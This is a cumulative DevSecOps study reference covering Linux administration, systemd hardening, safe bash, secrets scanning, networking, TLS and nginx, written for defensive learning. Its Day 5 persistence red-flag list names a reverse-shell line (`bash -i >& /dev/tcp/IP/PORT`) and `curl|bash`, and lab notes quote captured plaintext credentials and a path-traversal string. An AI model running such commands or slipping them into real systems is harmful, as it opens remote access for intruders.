# SUMMARY.md — Cumulative Command & Concept Reference

Running reference for the 90-day DevSecOps program. Appended at the end of each day.
Covers **Days 1–7**.

---

# COMMAND REFERENCE

## System & process inspection

| Command | What it does | When you reach for it |
|---|---|---|
| `uname -a` | Kernel, arch, hostname | Confirming what OS/kernel you're on |
| `cat /etc/os-release` | Distro name and version | Identifying the exact release |
| `free -h` | Memory used/free | Checking for memory exhaustion |
| `df -h` | Disk space per filesystem | **First check on any "it's broken" report** |
| `df -h /path` | Space for one mount | Cutting through noisy mount lists |
| `df -i` | **Inode** usage | "Disk full" but `df -h` shows free space |
| `du -sh /path/*` | Size per item | Finding *what* consumed the space |
| `du -sh /path/* \| sort -h` | Sorted by size | Biggest offenders first |
| `uptime` | Load average | Is the box saturated? |
| `ps aux --sort=-%mem \| head` | Top memory consumers | Runaway process hunt |
| `ps -eo pid,ppid,user,comm --forest` | Process tree with ancestry | Seeing parent/child relationships |
| `ps -eo user \| tail -n +2 \| sort \| uniq -c \| sort -rn` | Process count per user | **Measuring root attack surface** |
| `ps -p 1 -o comm=` | What is PID 1 | Confirming systemd vs init shim |
| `lsof /path/to/file` | Which processes hold a file open | **Before deleting any large file** |
| `cat /proc/<pid>/comm` | Kernel's live truth about a process | When `ps` output is ambiguous |

## Files, permissions & ownership

| Command | What it does | When you reach for it |
|---|---|---|
| `ls -l` | Long listing: perms, owner, group | Reading permissions |
| `ls -ld <dir>` | The **directory itself**, not contents | **Deletion/traversal problems** |
| `ls -n` | Numeric UID/GID instead of names | Verifying IDs match across systems |
| `chmod 755 file` | Set permission bits numerically | Standard permission setting |
| `chmod +x file` | Add execute for all triads | Making a script runnable |
| `chown user:group file` | Change owner and group | Fixing ownership |
| `chgrp group file` | Change group only | Assigning a dir to a team |
| `umask` | Mask subtracted from new-file defaults | Explaining why new files are 644 |
| `namei -l /full/path` | Permissions of **every path component** | "Which part of the path blocks me?" |
| `lsattr file` | Filesystem-level attributes (`i`=immutable, `a`=append-only, `e`=extent/normal) | When even **root** is denied |
| `getfacl file` / `getfacl -n file` | Read ACLs (numeric IDs with `-n`) | Perms look right but access fails |
| `setfacl -d -m g::rwx dir` | **Default ACL** — new files inherit group write | Shared dirs that must stay writable |
| `file <path>` | Identify file type by content | `data` = binary; `ASCII text` = real log |
| `head -c 200 file \| xxd` | First bytes in hex | Confirming what a file actually contains |
| `truncate -s 0 file` | Empty a file, keep the inode | **Frees space even with a live writer** |
| `stat file` | Full metadata | Timestamps, inode, exact mode |

## Users, groups & privilege

| Command | What it does | When you reach for it |
|---|---|---|
| `id` / `id <user>` | UID, GID, all group memberships | **Verifying who a process actually is** |
| `id -nG` | Group names only | Quick membership check |
| `getent group <name>` | Group entry + members | Confirming who's in a group |
| `useradd --system --no-create-home --shell /usr/sbin/nologin <n>` | Minimal service account | Creating a non-root service identity |
| `usermod -aG <group> <user>` | Add to supplementary group | Granting group access (`-a` = append!) |
| `sudo -u <user> <cmd>` | Run as another user | **Testing permissions as the real identity** |
| `sudo -u <user> bash -c '...'` | Multi-command as another user | Testing with redirects/pipes |
| `sudo -l` | What sudo rights do I have | Auditing your own privilege |
| `sudo -n <cmd>` | Non-interactive (no password prompt) | Crisp allow/deny testing |
| `visudo -c -f <file>` | **Syntax-check** a sudoers file | Always, before trusting a sudoers edit |

## systemd & services

| Command | What it does | When you reach for it |
|---|---|---|
| `systemctl status <unit>` | State, PID, recent logs | **First command for any service issue** |
| `systemctl start/stop/restart <unit>` | Control a service | Basic lifecycle |
| `systemctl enable --now <unit>` | Enable at boot **and** start now | Making a service permanent |
| `systemctl is-enabled <unit>` | Boot-start status | Verifying persistence |
| `systemctl daemon-reload` | Re-read unit files | **After every unit file edit** |
| `systemctl --failed` | All failed units | System-wide health sweep |
| `systemctl list-timers --all` | Every timer, next/last run | **Scheduled-execution audit** |
| `systemctl edit --full <unit>` | Edit a unit safely | Modifying units |
| `systemd-analyze security <unit>` | **Exposure score 0.0–10.0** + per-directive checklist | Measuring/proving hardening |
| `journalctl -u <unit>` | Logs for one unit | Reading service output |
| `journalctl -u <unit> -n 30 --no-pager` | Last 30 lines, no pager | Quick error hunt |
| `journalctl -p err -b` | Errors this boot | Broad "what's broken" sweep |
| `journalctl --since "2 hours ago"` | Time-bounded logs | **Correlating to "what changed"** |

**systemd exit codes:** `203/EXEC` = couldn't execute the ExecStart target (file missing, not executable, bad shebang). Distinct from the program running and failing on its own.

## Packages & integrity

| Command | What it does | When you reach for it |
|---|---|---|
| `apt update && apt upgrade -y` | Refresh index, patch | Always before installing |
| `apt list --upgradable` | What's pending | Evidence *before* acting |
| `dpkg -S <file>` | **Which package owns a file** | Attributing unknown cron jobs/binaries |
| `sha256sum <file>` | Compute checksum | **Verifying any downloaded binary** |
| `ls /etc/apt/keyrings/` | Per-repo GPG keys | Auditing repo trust |

## Bash & scripting

| Construct | Meaning | Notes |
|---|---|---|
| `set -e` | Exit on **command failure** | Doesn't fire in `if`/`&&`/`\|\|`/`!` conditions |
| `set -u` | Error on **unset** variable | Does **NOT** catch set-but-empty |
| `set -o pipefail` | Pipeline fails if **any** stage fails | Without it `tar \| gzip` hides tar's death |
| `set -euo pipefail` | All three | Standard header |
| `"$var"` | Quoted expansion | Stops word-splitting + globbing |
| `${1:?message}` | **Required** — error if unset **or empty** | The only guard for the empty case |
| `${2:-default}` | **Optional** — fallback if unset/empty | Optional args |
| `$(cmd)` | **Run** cmd, substitute its output | `"cmd"` stores literal text — not the same |
| `[[ -d "$x" ]]` | Is a directory | Guard before destructive ops |
| `[[ -f "$x" ]]` | Is a regular file | Guard for file args |
| `[[ -e "$x" ]]` | Exists (any type) | Existence check |
| `[[ ${#arr[@]} -gt 0 ]]` | Array non-empty | `-gt/-lt/-eq/-ne/-ge/-le` for numbers |
| `shopt -s nullglob` | Non-matching glob → **nothing** | Otherwise you process a literal `*.log` |
| `trap 'cmd' ERR` | Run on any command failure | Failure alerting |
| `>&2` | Send to stderr | Errors separable from output |
| `>` vs `>>` | Overwrite vs append | **`>` recreates at umask default, dropping chmod** |
| `\| tee -a file` | Write to file **and** stdout | Logging that cron also captures |
| `shellcheck script.sh` | Static analysis | Grammar only — **not** correctness |

**Text processing:**
| Command | Purpose |
|---|---|
| `awk '{print $1}' file` | Extract field 1 — **single quotes** so bash doesn't eat `$1` |
| `sort` | Group identical lines (required before `uniq`) |
| `uniq -c` | Collapse duplicates, prepend count |
| `sort -rn` | Numeric, highest first |
| `sort -h` | Human-readable sizes (1K, 2M) |
| `grep -c 'pattern' file` | Count matching lines |
| `head -n N` / `tail -n N` | First / last N lines |
| `tail -n +N` | Everything **from** line N onward |
| `cut -d' ' -f2-` | Fields 2+ using space delimiter |
| `xargs -r cmd` | Build args from stdin (`-r` = skip if empty) |
| `find dir -maxdepth 1 -name 'x*' -printf '%T@ %p\n'` | Robust file listing with mtime — **never parse `ls`** |

**Classic pipeline — top N by frequency:**
```bash
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -5
```

## Git & secrets

| Command | What it does |
|---|---|
| `git log --oneline -N` | Compact recent history |
| `git log --stat --oneline -1 <sha>` | What changed in one commit |
| `git status` | Staged / unstaged / untracked |
| `git reset HEAD~1` | Undo last commit, keep files |
| `git reset HEAD <file>` | Unstage a file |
| `gitleaks git .` | Scan **full repo history** |
| `git diff --cached \| gitleaks stdin` | Scan **staged** changes (pre-commit) |
| `gitleaks dir -s .` | Scan a directory (non-git) |

**gitleaks v8.19+ syntax change:** `detect` → `git`, `detect --no-git` → `dir`, `protect --staged` → `git diff --cached | gitleaks stdin`. Old forms work but are hidden from help — most online tutorials are stale.

## Scheduling

| Command | What it does |
|---|---|
| `crontab -e` / `crontab -l` | Edit / list your crontab |
| `sudo crontab -l` | **Root's** crontab |
| `cat /etc/crontab` | System-wide crontab |
| `ls -la /etc/cron.d/` | Drop-in jobs (**common hiding spot**) |
| `ls -la /etc/cron.{hourly,daily,weekly,monthly}/` | run-parts directories |
| `ls -la /var/spool/cron/crontabs/` | Every user's crontab |

**Cron format:** `minute hour day-of-month month day-of-week command`
Always append `>> /path/log 2>&1` — without it, output goes nowhere.

## Networking

| Command | What it does | Layer |
|---|---|---|
| `ip addr show` | Interfaces and their IPs | L3 |
| `ip route show` | Routing table; `default via X` = gateway | L3 |
| `ip neigh show` | ARP table (IP↔MAC) | L2 |
| `ss -tulnp` | **Listening** sockets + owning process | L4 |
| `ss -tun` | **Active** connections | L4 |
| `cat /etc/resolv.conf` | Which DNS resolver this box uses | L7 |
| `tcpdump -i <if> -A -s 0 'filter'` | Capture packets, ASCII payload, full length | All |
| `tcpdump -w file.pcap` | Write raw capture to file | — |
| `tcpdump -r file.pcap -A -n` | Read a saved capture | — |
| `base64 -d` | Decode base64 | — |

**tcpdump flags:** `-i` interface · `-A` ASCII payload · `-s 0` full packet (default truncates) · `-n` no DNS resolution · `-w` write file · `-r` read file · `'tcp port 8080'` BPF filter.

**Filter the noise:** `tcpdump -r cap.pcap -A -n | grep -Ei 'password|authorization|GET|POST'`

---

# CONCEPTS BY DAY

## Day 1 — Environment & attack-surface baseline (CC7.1)
- **Filesystem map:** `/etc` = declared config (what it *should* be) · `/var` = state and logs (what *happened*) · `/usr`,`/bin`,`/sbin` = executable surface · `/home`,`/root` = identities · `/tmp` = world-writable staging ground · `/proc` = kernel's live truth.
- **Socket triage:** the **Local Address** column decides exposure. `127.0.0.1`/`::1` = this machine only. `0.0.0.0`/`*` = every interface **this machine has** — *not* automatically "the internet"; actual reachability depends on which interface and what it connects to.
- **Baseline logic:** you cannot detect drift you never recorded. A baseline is evidence only if it is (a) captured at a known-good moment, (b) **stored immutably** (git commits are hash-chained → tamper-evident), and (c) **re-runnable for comparison**. Detection = baseline + comparison + immutability.
- **Isolation:** disposable lab instance so destructive labs never touch daily-driver work.

## Day 2 — Permissions & least privilege (CC6.1)
- 9 bits: owner/group/other × r/w/x. `r=4 w=2 x=1`.
- **On directories:** `r` = list names · `w` = **add/delete/rename entries** · `x` = traverse/enter.
- **Deleting a file is a WRITE to its DIRECTORY**, not to the file. You can delete a file you can't read; you can be unable to delete your own file.
- **Special bits (leading digit):** setuid `4` = run as the **file's owner** (not "temporary root" — root only when root owns it) · setgid `2` = on a dir, new files inherit the dir's group · sticky `1` = delete only files you own.
- **Setuid is a privilege-escalation primitive by design.** The finding question is: *does this binary genuinely need root, and is it audited?* Not the permission bits, not who can execute it.
- **Three independent levers for a shared dir:** setgid → group *ownership* · `g+w`/default ACL → *editing* · sticky → *delete-protection*. setgid does **not** grant group write.
- `>` truncates and **recreates** a file at the umask default, silently discarding an earlier `chmod`. Per-file chmod is fragile; use default ACLs or a `002` umask.
- **sudoers:** `user HOST=(runas) NOPASSWD: /exact/command`. `NOPASSWD` scopes to *that command only*. Always `visudo`. Use `/etc/sudoers.d/` drop-ins, mode 440.
- **Debugging rule:** when **root** is denied a basic operation, the cause is *below* permissions (immutable attribute, MAC, filesystem).
- **Test as the identity you're testing.** Half of "permissions are confusing" is running verification as the wrong user.

## Day 3 — Processes, systemd, packages (CC6.1, CC6.8)
- **The security question for any process: what user does it run as?** That bounds what an attacker who hijacks it can do. Root process count = attack surface; each is a no-escalation path to full control.
- **Non-root services convert "one bug = own the box" into "one bug = contained foothold."**
- Unit sections: `[Unit]` metadata/ordering · `[Service]` execution + hardening · `[Install]` boot behaviour.
- `Type=oneshot` ending `inactive (dead)` is **success**, not failure.
- **Hardening directives that matter:** `NoNewPrivileges=true` (kernel refuses privilege gain on exec → **neutralizes setuid escalation**) · `ProtectSystem=strict` (filesystem read-only) · `PrivateTmp=true` (isolated /tmp) · `PrivateNetwork=true` (no network at all — biggest score mover) · `CapabilityBoundingSet=` empty (drops all ~40 capabilities) · `SystemCallFilter=@system-service` (seccomp allowlist) · `RestrictSUIDSGID=true`.
- **Measured result: 8.3 EXPOSED → 1.9 OK with function preserved.** The score is a *checklist coverage* metric, not a threat assessment — it knows nothing about your code's own bugs.
- **Timers > cron:** journald logging by default · `Persistent=true` catches up missed runs · full unit sandboxing applies · unit files are version-controllable and diffable (crontabs are scattered and hideable).
- **Package integrity:** apt installs **as root**, so signature verification prevents a malicious mirror/MITM from delivering a root-installed payload. **Per-repo keys (`signed-by=`) beat the old global `apt-key` store because of SCOPE OF TRUST** — globally, any trusted key could vouch for *any* repo; `signed-by=` binds one key to one repo.

## Day 4 — Safe bash (CC6.1, CC8.1)
- **Shell expansion order:** substitute → **word-split** → **glob-expand**. The last two are where scripts get exploited.
- **Three distinct bug classes, three distinct fixes — none substitutes for another:**
  - spaces/wildcards **in** a variable → **quoting** `"$var"`
  - variable **unset** → **`set -u`**
  - variable **set but empty** → **`${var:?}`** (quoting and `set -u` both miss this)
- **The Steam bug (2015):** `rm -rf "$STEAMROOT/"*` with an empty variable became `rm -rf "/"*`. Quoting was present and irrelevant — the collapse is an *emptiness* problem.
- **`shellcheck` validates grammar, not correctness.** A clean script can still do nothing you intended. Verify behaviour on **good, empty, and bad** input.
- **`bash script.sh` needs read; `./script.sh` needs read + execute** (kernel reads the shebang and requires the `x` bit).
- Log analysis surfaces attacker behaviour: one IP + repeated 401s on `/login` = brute force; `/../../etc/passwd` = path traversal.

## Day 5 — Automation & secrets hygiene (A1.2, CC6.8, CC7.1)
- **Backup assurance ladder — four different claims:** scheduled ≠ executed ≠ integrity-verified ≠ **recoverable**. Auditors ask about the last. Only a restore drill (`diff -r` against source) proves it.
- The classic disaster is not "no backups" but "backups silently failing for months" — `tar | gzip` exits 0 even when tar dies.
- **Test your failure path.** An alert that has never fired is an assumption.
- **Scanner limits:** gitleaks missed a raw AWS secret key (40 base64 chars ≈ indistinguishable from any hash). It detects **prefixed** secrets (`AKIA…`, `ghp_…`, `xoxb-…`, `-----BEGIN … KEY-----`). Every detector trades sensitivity vs false positives — **know what yours misses**.
- **Local hooks are convenience, not enforcement:** not version-controlled, don't survive a clone, and `git commit --no-verify` bypasses them. CI-side scanning is the enforcement layer. Two gaps (detection + enforcement) need two different fixes.
- **Fail-closed design:** if the scanner is missing, the hook must **block**, not pass.
- **Cron environment trap:** no shell profile loaded, minimal `$PATH`, different cwd. Use absolute paths. Security variant = **PATH hijacking** (attacker-controlled dir earlier in `$PATH` → root runs their binary on a schedule).
- **Root-cron review checklist:** (1) who can write the script and its parent dirs (2) guarded/quoted variables (3) absolute paths or explicit `PATH` (4) untrusted input reaching a *code* position (`eval`, `curl|bash`, `sh -c "...$var..."`) (5) output logged and fails safely.
- **Persistence red flags:** `curl|bash`, base64-decoded commands, `@reboot`, paths in `/tmp` or `/dev/shm`, `/etc/cron.d` files no package owns, `bash -i >& /dev/tcp/IP/PORT`.
- Production example of Day 2: `/var/spool/cron/crontabs` is `drwx-wx--T` (1730) — group write without read, sticky delete-protection.

## Day 6 — Consolidation & debugging method
- **The four-step method:** **Observe** (ask the system, not the ticket) → **Read the error** (it usually names the cause) → **Localize** (which layer?) → **Fix ONE thing and verify**.
- **Step 0 for real incidents: "what changed?"** Most incidents follow a deploy, config edit, package upgrade, cert expiry, or a disk finally filling. Check `dpkg.log`, `journalctl --since`, deploy history.
- **Broaden before narrowing** when the failing component is unknown:
  ```bash
  systemctl --failed ; df -h ; free -h ; uptime ; journalctl -p err -b | tail -40
  ```
- **Time correlation** is the strongest tool: "failures started at 03:14 — what else happened at 03:14?"
- Write observations down as you go; change one thing at a time.

## Day 7 — Networking I
- **Layers = addressing + tools:** L2 MAC (`ip link`, `ip neigh`) · L3 IP/routes (`ip addr`, `ip route`) · L4 ports (`ss`, `nc`) · L7 app (`curl`, `dig`, `tcpdump -A`). Localize a network fault by walking bottom-up: IP? route? port? app?
- **`lo` is always loopback, never your real network path.** Find the interface holding your routable address.
- **Default route** = "everything I don't otherwise know how to reach, send here." The **gateway** (routes packets) and the **resolver** (`/etc/resolv.conf`, turns names into IPs) are different things.
- **CIDR method — no memorized tables:**
  1. host bits = `32 − prefix`
  2. block size = `2^(host bits)`
  3. blocks start at multiples of the block size — **find which block contains your address** (it's often not a boundary)
  4. first address = network · last = broadcast · usable = total − 2
- Prefix < /24: host bits spill into the **third** octet. `/22` → 10 host bits → 2 in the third octet → blocks of 4 there.
- **Backwards:** need N usable hosts → smallest `2^h ≥ N+2` → prefix = `32 − h`.
- **Forwards:** split into N subnets → borrow `log₂(N)` bits (4 subnets = +2 bits).
- **AWS reserves 5 addresses per subnet, not 2** → a `/24` VPC subnet gives **251** usable.
- **ARP has no authentication.** Any host can claim any IP; first answer wins. → **ARP spoofing**: attacker announces "the gateway is at my MAC," silently becomes machine-in-the-middle, forwards traffic so nothing looks broken. Requires no exploit — just presence on the segment.
- **Plaintext protocols leak everything.** Captured in a real `tcpdump`: `GET /login?user=bassam&password=SuperSecret123` in readable ASCII, and `Authorization: Basic YWRtaW46QWRtaW5QQHNzdzByZA==` which is **base64 encoding, not encryption** — one `base64 -d` reverses it, no key needed. Query-string credentials leak *more widely* (proxy logs, browser history, Referer) but neither is protected on the wire.
- **TLS hides what you say, not who you say it to.** Still visible to an in-path attacker: source/destination IPs, ports, **SNI hostname** in the handshake, DNS lookups (unless DoH/DoT), certificate, and **traffic analysis** (timing, sizes, frequency). TLS protects payload, not metadata.
- ARP spoofing + plaintext protocols together are the whole argument for TLS everywhere — and why "it's only internal traffic" is not a defence, since internal segments are exactly where ARP spoofing works.
- **Operational caution learned:** `python3 -m http.server` serves the **current directory** — it exposed the entire repo including `.git/`. An exposed `.git` over HTTP lets an attacker reconstruct full source history and any committed secrets.

---

## DNS (added Day 8)

| Command | What it does | When you reach for it |
|---|---|---|
| `dig <name>` | Full lookup: answer section, TTL, flags | Standard resolution check |
| `dig +short <name>` | Answer only | Scripting, quick checks |
| `dig @1.1.1.1 <name>` | Query a **specific** resolver | Comparing resolvers; bypassing a broken local one |
| `dig +trace <name>` | Walk root to TLD to authoritative yourself | Delegation chain (blocked by WSL2 DNS proxy) |
| `dig NS <name>` | Authoritative nameservers | Who controls the zone |
| `dig TXT <name>` | TXT records | SPF/DKIM/verification — leaks infrastructure |
| `dig CAA <name>` | Which CAs may issue for this domain | Checking CA scope restriction |
| `dig -x <ip>` | Reverse lookup (PTR) | IP to name |

**Record types:** A (IPv4), AAAA (IPv6), CNAME (alias — *dangling CNAME = subdomain takeover*), NS, MX, TXT, SOA, **CAA**, PTR.

## TLS / certificates (added Day 8)

| Command | What it does |
|---|---|
| `openssl s_client -connect host:443 -servername host` | Open TLS connection; `-servername` = SNI |
| `... -showcerts` | Print every certificate in the chain |
| `... -CAfile ca.crt` | Verify against a specific CA |
| `... -verify_hostname <name>` | **Enforce hostname matching** (not default) |
| `... -tls1_1` | Probe whether old protocols are accepted |
| `openssl x509 -in cert -noout -subject -issuer -dates` | Certificate identity and validity |
| `openssl x509 -in cert -noout -ext subjectAltName` | Hostnames the cert is valid for |
| `openssl genrsa -out key.pem 4096` | Generate a private key |
| `openssl req -x509 -new -nodes -key ca.key -days N -out ca.crt` | Self-signed root CA |
| `openssl req -new -key server.key -out server.csr` | Certificate Signing Request |
| `openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -extfile ext -out server.crt` | Sign a CSR |
| `openssl s_server -accept 8443 -cert server.crt -key server.key -www` | Test TLS server |
| `curl --cacert ca.crt https://host/` | curl trusting a specific CA |

**Verify return codes:** `0` = chain OK (says nothing about hostname), `21` = CA unknown, `62` = hostname mismatch.

## Day 8 — DNS, HTTP, TLS and certificates

- **Resolution path:** stub, recursive resolver, root, TLD, authoritative. Three referrals for one lookup — which is why caching exists.
- **DNS is a security control.** Control what a name resolves to and TLS still works perfectly — it encrypts faithfully to the attacker's server.
- **TTL is a security parameter.** A poisoned record persists in caches for the full TTL *after* the fix. Lower TTLs before planned changes.
- **Cross-resolver disagreement** is diagnostic: benign (geo/CDN/anycast) or serious (hijacking, poisoning). Query the authoritative server to settle it.
- **DNS enumeration is recon.** NS and A records revealed hosting and CDN; TXT records expose mail infrastructure and SaaS vendors.
- **Certificate chain:** each cert's issuer equals the next cert's subject, walked upward to a certificate already in the trust store.
- **121 root CAs** are trusted to vouch for *any* domain. Trust is not scoped — one compromised CA breaks everything (DigiNotar 2011). CAA records narrow it.
- **SAN, not CN.** Wildcards match exactly one label.
- **Chain validation is not hostname validation.** Apps that skip hostname checking accept any valid cert from any CA — MITM with a legitimate certificate.
- **Old protocol versions are a downgrade surface.** Removal is the only fix.
- **Root CA is self-signed:** subject and issuer identical. Trust comes from being *installed*, not verified.
- **The trust model in two commands:** same cert gives `21` without the CA, `0` with `-CAfile`. Also exactly how corporate TLS interception works.

---

## Nginx (added Day 9)

| Command | What it does | When you reach for it |
|---|---|---|
| `nginx -t` | Test config syntax without applying | **Always** before reload |
| `systemctl reload nginx` | Re-read config, no dropped connections | Applying config changes |
| `systemctl status nginx` | Running state + recent errors | First check on any nginx issue |
| `ps -eo user,comm \| grep nginx` | Master vs worker users | Verifying privilege separation |
| `curl -sI https://host/` | Response headers only | Checking security headers |
| `curl --cacert ca.crt -sI https://host/` | Headers, trusting a specific CA | Testing a private-CA server |

**Config layout:** `/etc/nginx/sites-available/` holds configs; `/etc/nginx/sites-enabled/` holds symlinks to the active ones. Enable with `ln -s`, disable with `rm` on the symlink.

**Key directives:**

| Directive | Purpose |
|---|---|
| `listen 8443 ssl` | Port + enable TLS |
| `ssl_certificate` / `ssl_certificate_key` | Cert (644) and private key (600, root only) |
| `ssl_protocols TLSv1.2 TLSv1.3` | Remove downgrade surface |
| `server_tokens off` | Hide nginx version |
| `proxy_pass http://127.0.0.1:3000` | Forward to backend |
| `proxy_set_header X-Real-IP $remote_addr` | Give backend the true client IP |
| `proxy_hide_header Server` | Strip the backend's version banner |
| `add_header ... always` | Apply header to error responses too |
| `return 301 https://$host$request_uri` | HTTP to HTTPS redirect |

**Security headers:** `Strict-Transport-Security` (blocks SSL-stripping) · `X-Content-Type-Options: nosniff` (blocks content-type guessing) · `X-Frame-Options: DENY` (blocks clickjacking) · `Content-Security-Policy: default-src 'self'` (neuters most XSS) · `Referrer-Policy: no-referrer`.

## Day 9 — Nginx I: reverse proxy and TLS termination

- **Three jobs, not three products.** Web server (files from disk), reverse proxy (forwards to a backend), load balancer (multiple backends + health checks). Nginx does all three depending on config. *Forward* proxy sits in front of clients; *reverse* proxy sits in front of servers.
- **nginx and Caddy are competitors** (front door). **Tomcat is a Java application server** — it *runs* application code, like Gunicorn or Node. Something runs your code; something else sits in front managing the outside world. Conflating them is a common interview tell.
- **Why a reverse proxy:** backend leaves the network (loopback bind), TLS terminates once, policy applies uniformly, backends become swappable, static content never reaches the app.
- **Privilege separation observed:** one root master (binds ports, reads the private key) and unprivileged workers handling network input. A compromised worker gets `www-data`, not root, and cannot read the key.
- **Environment finding:** the two WSL2 instances **share a network namespace** — filesystem and process isolation hold, port isolation does not. A bind in one blocks the other. An empty Process column in `ss -tlnp` means the socket owner is outside this instance's namespace.
- **`nginx -t` succeeding while `ExecStart` fails** distinguishes "config invalid" from "cannot acquire resources." Always test before reload.
- **The padlock is not a safety indicator.** Installing a CA into the Windows trust store turned a rejected certificate into a clean padlock with nothing about the certificate changed. This is exactly how corporate TLS interception works — and how service meshes and CA-installing malware work. *The padlock means "signed by something this machine was told to trust."*
- **`X-Forwarded-For` is client-supplied.** `$proxy_add_x_forwarded_for` **appends** to whatever the client sent, so an app reading the *first* value gets an attacker-chosen IP. Only trustworthy if every hop is a proxy you control. Read the last value, or overwrite with `$remote_addr`.
- **What the proxy does NOT protect:** application-layer vulnerabilities (SQLi, authN, IDOR — the payload is forwarded faithfully), denial of service, and backend compromise. Transport security says nothing about application correctness.
- **Plaintext proxy-to-backend** is acceptable over loopback on one host; it is a **finding** the moment the hop crosses a real network, because ARP spoofing makes internal segments observable. This is the argument for mTLS everywhere in service meshes.

---

## Nginx load balancing and rate limiting (added Day 10)

| Directive | What it does |
|---|---|
| `upstream <name> { server ...; }` | Define a pool of backends |
| `least_conn;` | Route to fewest **active** connections |
| `ip_hash;` | Same client IP to same backend (session stickiness) |
| *(no directive)* | Default is round robin |
| `max_fails=2 fail_timeout=10s` | Passive health check: N failures in T seconds marks a backend down for T |
| `proxy_next_upstream error timeout http_502 http_503 http_504` | Retry a failed request on the next backend — makes failover invisible |
| `proxy_connect_timeout 2s` | How long to wait for a backend connection |
| `limit_req_zone $binary_remote_addr zone=NAME:10m rate=10r/s;` | Define a rate-limit zone (http context) |
| `limit_req zone=NAME burst=5 nodelay;` | Apply the limit; burst = bucket depth, nodelay = serve immediately |
| `limit_req_status 429;` | Return 429 instead of the default 503 |
| `add_header X-Upstream $upstream_addr always;` | Show which backend served — **debug only** |

**Testing commands:**

| Command | Purpose |
|---|---|
| `for i in $(seq 6); do curl -s URL; done` | Sequential requests |
| `for i in $(seq 10); do curl -s URL & done; wait` | **Concurrent** requests (needed to exercise least_conn) |
| `curl -s -o /dev/null -w "%{http_code} " URL` | Print only the status code |
| `sudo tail -20 /var/log/nginx/error.log` | Rate-limit and upstream-failure evidence |

## Day 10 — Nginx II: load balancing, health checks, rate limiting

- **`least_conn` does not distribute sequential traffic.** With serialised requests both backends always hold zero active connections, so it is a tie every time and nginx picks the first server. Proven: 12 sequential requests all hit BACKEND-1; the same traffic under round robin alternated cleanly, and concurrent traffic under `least_conn` also alternated. **The algorithm changes behaviour in ways only visible under the right traffic pattern.**
- **Round robin is weighted and its counter carries across requests** — short samples will not alternate perfectly. Do not read a pattern into small-sample noise.
- **Open-source nginx health checks are PASSIVE** — a backend is discovered dead by failing a real user's request. The first user after a failure pays for the discovery. Active probing is nginx Plus, or an external checker, or a service mesh.
- **`proxy_next_upstream` is what makes failover invisible** — the request is retried on a live backend rather than returned as an error. Verified: 200s continued with a backend killed.
- **nginx retries failed backends after `fail_timeout`** rather than blacklisting permanently. Verified on restart.
- **Rate limiting is evaluated BEFORE `proxy_pass`** — a throttled request never reaches an upstream. Confirmed by the *absence* of connection-refused entries in the error log during a failover test. Cheap rejection precedes expensive work.
- **Test-design lesson: when two controls can each produce a non-200, the test cannot attribute the result.** A failover test returned a 429 that was actually rate limiting.
- **The token bucket, made visible:** 20 rapid requests gave seven 200s, then 429s, with isolated 200s scattered among them as the bucket refilled at ~1 token per 100 ms, then full recovery after 3 seconds. `rate` = refill speed, `burst` = bucket depth, `nodelay` = serve burst immediately. **Rate limiting is a continuously refilling allowance, not a binary gate.**
- **Rate limiting defends AVAILABILITY** — the first such control in the programme. It blunts credential stuffing, scraping, API abuse, app-layer DoS: attacks made of individually valid requests in illegitimate volume.
- **Its limits:** per-IP, so a botnet defeats it; and volumetric floods saturate bandwidth before nginx sees a packet (needs CDN/WAF/Shield). Tuning is a real tradeoff — too tight breaks users behind corporate NAT, too loose achieves nothing.
- **`X-Forwarded-For` corrected:** use `$remote_addr` (overwrite) not `$proxy_add_x_forwarded_for` (append). Appending lets a client inject a forged first value and defeat per-IP rate limiting and IP allowlisting.
- **`$binary_remote_addr` over `$remote_addr` in limit zones** — 4 bytes instead of a string; 10 MB holds roughly 160,000 IPs.

---

## Hardening (added Day 11)

| Command | What it does | When you reach for it |
|---|---|---|
| `sudo ufw default deny incoming` | Set default-deny inbound policy | Firewall baseline |
| `sudo ufw allow 8443/tcp comment 'x'` | Explicit allow with a documented reason | Permit by exception |
| `sudo ufw status verbose` | Full policy + rules | Evidence capture |
| `sudo iptables -L ufw-user-input -n --line-numbers` | The rules UFW actually generated | Verifying what got applied |
| `sudo fail2ban-client status` | List active jails | Confirming fail2ban config loaded |
| `sudo fail2ban-client status <jail>` | Failures and bans for one jail | Checking a jail is matching |
| `sudo fail2ban-client get <jail> ignoreip` | Which sources are exempt | Explaining why nothing got banned |
| `sudo tail /var/log/fail2ban.log` | Detection and ban events | Evidence that the filter matched |
| `sshd -t -f <file>` | Validate an sshd config WITHOUT applying it | Same discipline as `nginx -t` |
| `sudo find / -xdev -type f -perm -4000` | Inventory SUID binaries | Privilege-escalation surface |
| `sudo find / -xdev -type f -perm -0002` | World-writable files | Files an attacker can replace |
| `sudo awk -F: '($2=="") {print $1}' /etc/shadow` | Accounts with no password | Always a finding |
| `awk -F: '($3==0){print $1}' /etc/passwd` | UID 0 accounts | Should be root only |
| `dpkg -S <path>` | Which package owns a file | **A SUID file no package owns is a finding** |
| `stat -c %a <file>` | Numeric permission mode | Scriptable permission checks |

**Key sshd directives:** `PermitRootLogin no` · `PasswordAuthentication no` + `PubkeyAuthentication yes` (eliminates SSH credential stuffing) · `MaxAuthTries 3` · `LoginGraceTime 30` · `AllowUsers <list>` · `X11Forwarding no` / `AllowAgentForwarding no` / `AllowTcpForwarding no` / `PermitTunnel no` (each is a pivot path) · modern `KexAlgorithms`/`Ciphers`/`MACs` only · `LogLevel VERBOSE` (records key fingerprints — proves WHICH key authenticated).

**fail2ban structure:** filter (regex over a log) + jail (log, filter, thresholds) + action (firewall ban). `maxretry` failures within `findtime` triggers a ban for `bantime`.

## Day 11 — Hardening

- **The framing shift:** from "is this configured correctly" to **"what would an auditor or attacker find if they looked?"** Evidence pack = baseline, controls applied, re-measured, limitations stated.
- **Deny by default, permit by exception** — the same principle as `3770` directories (other gets nothing) and `CapabilityBoundingSet=` (drop all, add nothing back). The most consistently correct posture available.
- **An unowned SUID file in a home directory is a real finding.** The Day-2 lab artifact `demo-suid` was still present. Audit question: does it need root, is it audited, does a package own it? Use `dpkg -S` to attribute every SUID binary.
- **fail2ban `ignoreself`** exempts local sources by default — the filter still matches and logs, but no ban occurs. Correct behaviour; banning yourself from your own server is a classic self-inflicted outage. Evidence statement: "filter proven functional, ban action correctly suppressed for local traffic."
- **Defence in depth made concrete:** nginx returns 429s per request (cheap); fail2ban escalates repeat offenders to a network-level block so their packets never reach nginx at all.
